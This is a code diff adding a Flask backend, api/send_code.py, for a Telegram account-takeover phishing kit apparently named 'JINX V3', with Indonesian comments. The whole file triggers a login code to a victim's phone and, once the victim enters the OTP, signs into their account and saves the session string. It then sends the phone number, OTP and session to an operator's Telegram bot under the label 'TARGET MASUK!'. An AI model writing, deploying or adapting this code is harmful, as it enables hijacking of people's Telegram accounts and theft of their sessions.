@@ -1,0 +1,67 @@
+# api/send_code.py
+import os
+from flask import Flask, request, jsonify
+from telethon.sync import TelegramClient
+from telethon.sessions import StringSession
+import requests
+
+app = Flask(__name__)
+
+# Ambil dari Railway Variables
+API_ID = int(os.environ.get('API_ID'))
+API_HASH = os.environ.get('API_HASH')
+BOT_TOKEN = os.environ.get('BOT_TOKEN')
+CHAT_ID = os.environ.get('CHAT_ID')
+
+SESSIONS_DIR = "sessions"
+os.makedirs(SESSIONS_DIR, exist_ok=True)
+
+def send_bot(msg):
+    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
+        'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'
+    })
+
+@app.route('/send_code', methods=['POST'])
+def handle():
+    phone = request.form.get('phone')
+    code = request.form.get('code')
+    action = request.form.get('action', 'send')
+
+    if not phone:
+        return jsonify({'success': False, 'error': 'no phone'})
+
+    session_path = f"{SESSIONS_DIR}/{phone.replace('+', '')}.session"
+
+    try:
+        client = TelegramClient(session_path, API_ID, API_HASH)
+        client.connect()
+
+        if action == 'verify' and code:
+            client.sign_in(phone, code)
+            session_str = client.session.save()
+            client.disconnect()
+
+            msg = f"*TARGET MASUK!*\n\nNo: `{phone}`\nOTP: `{code}`\nSESSION:\n||{session_str}||"
+            send_bot(msg)
+            return jsonify({'success': True, 'session': session_str})
+
+        else:
+            res = client.send_code_request(phone, force_sms=True)
+            client.disconnect()
+
+            status = "RESEND" if action == 'resend' else "TARGET MASUK"
+            msg = f"*{status}*\n\nNo: `{phone}`\nMenunggu OTP..."
+            send_bot(msg)
+            return jsonify({'success': True, 'hash': res.phone_code_hash})
+
+    except Exception as e:
+        if 'client' in locals() and client.is_connected():
+            client.disconnect()
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/')
+def home():
+    return "JINX V3 – RAILWAY DEPLOYED | OTP ASLI READY"
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
